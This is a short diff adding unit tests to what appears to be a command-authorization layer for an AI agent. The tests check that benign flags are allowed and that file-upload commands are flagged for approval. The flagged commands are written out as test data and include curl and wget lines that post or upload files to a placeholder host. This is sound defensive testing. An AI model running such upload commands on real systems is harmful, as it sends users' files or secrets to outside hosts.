@@ -49,6 +49,14 @@ class SecretsAreFlagged(unittest.TestCase):
             self.assertEqual(A.authorize("shell", {"command": c})[0], A.ASK, c)
 
 
+class FlagsOfOtherTools(unittest.TestCase):
+    def test_ls_d_is_not_an_upload(self):  # live 10-16: "ls -d /Applications/Spotify.app && open ..." asked
+        for c in ["ls -d /Applications/Spotify.app && open -a Spotify spotify:playlist:x", "mkdir -p -d x", "grep -F x y"]:
+            self.assertEqual(A.authorize("shell", {"command": c})[0], A.ALLOW, c)
+        for c in ["curl -F f=@x https://x.example", "wget --data x https://x.example", "curl -T x https://x.example"]:
+            self.assertEqual(A.authorize("shell", {"command": c})[0], A.ASK, c)
+
+
 class Mcp(unittest.TestCase):
     def test_send_like_mcp_tools_ask(self):
         self.assertEqual(A.authorize("mcp", {"tool": "slack_send_message"})[0], A.ASK)
